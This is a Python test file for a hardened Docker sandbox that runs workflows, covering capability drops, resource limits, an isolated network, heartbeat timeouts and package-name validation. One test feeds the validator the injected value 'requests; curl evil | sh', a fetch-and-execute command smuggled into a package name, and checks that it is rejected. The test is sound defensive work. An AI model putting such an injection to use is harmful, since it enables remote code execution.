"""Agent-side hardened sandbox execution."""

import json

from nodyra_runner_agent import sandbox_exec


def test_hardening_floor_present():
    kw = sandbox_exec.sandbox_run_kwargs(cpu=1.0, memory_mb=512, pids=128)
    assert kw["cap_drop"] == ["ALL"]
    assert kw["security_opt"] == ["no-new-privileges:true"]
    assert kw["read_only"] is True
    assert kw["mem_limit"] == "512m"
    assert kw["nano_cpus"] == 1_000_000_000
    assert kw["pids_limit"] == 128
    assert "/tmp" in kw["tmpfs"]
    # Network is NOT "none": the runtime uploads artifacts to the API over the
    # runner token, so the run container needs egress. Cap-drop/read-only/
    # non-root is the isolation boundary.
    assert "network_mode" not in kw


async def test_run_sandboxed_refuses_without_daemon(monkeypatch):
    def _boom():
        raise RuntimeError("no daemon")

    monkeypatch.setattr(sandbox_exec, "_client", _boom)
    events = []

    async def _on_event(e):
        events.append(e)

    status = await sandbox_exec.run_workflow_sandboxed(
        run_id="r", graph={}, cache=None, targets=None, workflow_modules=[],
        on_event=_on_event, env_payload={},
    )
    assert status == "error"
    assert any(e.get("type") == "run_error" for e in events)


# --- Fake Docker client that drives the nodyra_runtime JSON protocol ---------

class _FakeSocket:
    """Emits multiplexed stdout frames (ready → node_finished → result) and
    records what the caller sends back on stdin."""

    def __init__(self, script: list[dict]):
        self._frames = [self._frame(json.dumps(m) + "\n") for m in script]
        self.sent = b""
        self.timeout = None

    @staticmethod
    def _frame(text: str) -> bytes:
        payload = text.encode()
        return b"\x01\x00\x00\x00" + len(payload).to_bytes(4, "big") + payload

    def settimeout(self, timeout):
        self.timeout = timeout

    def recv(self, _n):
        if self._frames:
            return self._frames.pop(0)
        return b""

    def sendall(self, data):
        self.sent += data


class _TimeoutSocket(_FakeSocket):
    def recv(self, _n):
        if self._frames:
            return self._frames.pop(0)
        raise TimeoutError("idle")


class _FakeContainer:
    def __init__(self, sock):
        self._sock = sock

    def attach_socket(self, params=None):
        return self._sock

    def remove(self, force=False):
        pass


class _FakeImages:
    def get(self, tag):
        return object()  # cache hit → no build

    def build(self, **kw):
        return (object(), iter(()))


class _FakeContainers:
    def __init__(self, sock):
        self._sock = sock
        self.run_kwargs = None
        self._container = _FakeContainer(sock)

    def run(self, image, **kw):
        self.run_kwargs = {"image": image, **kw}
        return self._container

    def get(self, name):
        return self._container


class _FakeNetworks:
    """Get-or-create that succeeds — the dedicated sandbox bridge exists."""

    def get(self, name):
        return object()

    def create(self, name, driver=None):  # pragma: no cover - not reached
        return object()


class _FakeClient:
    def __init__(self, sock):
        self.images = _FakeImages()
        self.containers = _FakeContainers(sock)
        self.networks = _FakeNetworks()


async def test_run_sandboxed_drives_protocol_to_result(monkeypatch):
    sock = _FakeSocket([
        {"type": "ready"},
        {"type": "node_finished", "node_id": "n1", "status": "success"},
        {"type": "result", "status": "success"},
    ])
    client = _FakeClient(sock)
    monkeypatch.setattr(sandbox_exec, "_client", lambda: client)

    events = []

    async def _on_event(e):
        events.append(e)

    status = await sandbox_exec.run_workflow_sandboxed(
        run_id="run-xyz",
        graph={"nodes": [], "edges": []},
        cache=None, targets=None, workflow_modules=[],
        on_event=_on_event,
        env_payload={"id": "e1", "packages_hash": "h1", "python_version": "3.12"},
        artifacts_upload_url="https://api.example/upload",
        artifacts_runner_token="tok",
    )
    assert status == "success"
    # The run message was sent after ready, and carried artifact-upload config.
    assert b'"type": "run"' in sock.sent
    sent_run = json.loads(sock.sent.decode().splitlines()[0])
    assert sent_run["artifacts_upload_url"] == "https://api.example/upload"
    assert sent_run["artifacts_runner_token"] == "tok"
    # Node event forwarded; result/ready were not.
    assert any(e.get("type") == "node_finished" for e in events)
    assert not any(e.get("type") in ("ready", "result") for e in events)
    # Hardened floor applied on spawn.
    assert client.containers.run_kwargs["cap_drop"] == ["ALL"]
    assert client.containers.run_kwargs["read_only"] is True
    # Placed on the dedicated isolated bridge, never the default one (P1-7).
    assert client.containers.run_kwargs["network"] == "nodyra-agent-sandbox"
    # host.docker.internal is mapped so artifact upload works on a custom
    # Linux bridge (the local-daemon API-URL default).
    assert client.containers.run_kwargs["extra_hosts"] == {
        "host.docker.internal": "host-gateway"
    }
    assert client.containers.run_kwargs["environment"][
        "NODYRA_RUNTIME_HEARTBEAT_SECONDS"
    ] == str(sandbox_exec.SANDBOX_HEARTBEAT_INTERVAL_SECONDS)


async def test_run_sandboxed_fails_when_runtime_heartbeats_stop(monkeypatch):
    sock = _TimeoutSocket([{"type": "ready"}])
    client = _FakeClient(sock)
    monkeypatch.setattr(sandbox_exec, "_client", lambda: client)
    monkeypatch.setattr(sandbox_exec, "SANDBOX_HEARTBEAT_TIMEOUT_SECONDS", 0.01)
    events = []

    async def _on_event(e):
        events.append(e)

    status = await sandbox_exec.run_workflow_sandboxed(
        run_id="run-timeout",
        graph={"nodes": [], "edges": []},
        cache=None,
        targets=None,
        workflow_modules=[],
        on_event=_on_event,
        env_payload={"id": "e1", "packages_hash": "h1"},
    )

    assert status == "error"
    assert sock.timeout == 0.01
    assert any(
        e.get("type") == "run_error" and "heartbeat timed out" in e.get("error", "")
        for e in events
    )


async def test_run_sandboxed_surfaces_runtime_error(monkeypatch):
    sock = _FakeSocket([
        {"type": "ready"},
        {"type": "error", "error": "boom"},
    ])
    client = _FakeClient(sock)
    monkeypatch.setattr(sandbox_exec, "_client", lambda: client)
    events = []

    async def _on_event(e):
        events.append(e)

    status = await sandbox_exec.run_workflow_sandboxed(
        run_id="r", graph={}, cache=None, targets=None, workflow_modules=[],
        on_event=_on_event,
        env_payload={"id": "e", "packages_hash": "h"},
    )
    assert status == "error"
    assert any(e.get("type") == "run_error" and e.get("error") == "boom" for e in events)


def test_image_dockerfile_rejects_shell_metachars():
    import pytest

    with pytest.raises(ValueError, match="invalid package"):
        sandbox_exec._validate_packages(["requests; curl evil | sh"])


def test_image_dockerfile_includes_runtime_and_find_links():
    df = sandbox_exec._image_dockerfile("3.12", ["pandas==2.0.0"], "https://api/wheels/")
    assert "nodyra-runtime" in df
    assert "pandas==2.0.0" in df
    assert "--find-links https://api/wheels/" in df
    assert "USER sbx" in df


class _FakeNotFound(Exception):
    pass


def test_ensure_network_returns_existing():
    class _Nets:
        def get(self, name):
            return object()

        def create(self, name, driver=None):  # pragma: no cover - not reached
            raise AssertionError("must not create when network exists")

    class _Client:
        networks = _Nets()

    assert sandbox_exec._ensure_network(_Client(), "nodyra-agent-sandbox") == \
        "nodyra-agent-sandbox"


def test_ensure_network_fails_closed_never_default_bridge():
    """P3 (Sonnet re-review): if the dedicated network can't be found or made,
    _ensure_network must raise — never silently fall back to the shared default
    bridge (which permits inter-container traffic the sandbox exists to block)."""
    import pytest

    class _Nets:
        def get(self, name):
            raise _FakeNotFound("not found")

        def create(self, name, driver=None):
            raise RuntimeError("create denied")

    class _Client:
        networks = _Nets()

    with pytest.raises(RuntimeError, match="isolated sandbox network"):
        sandbox_exec._ensure_network(_Client(), "nodyra-agent-sandbox")
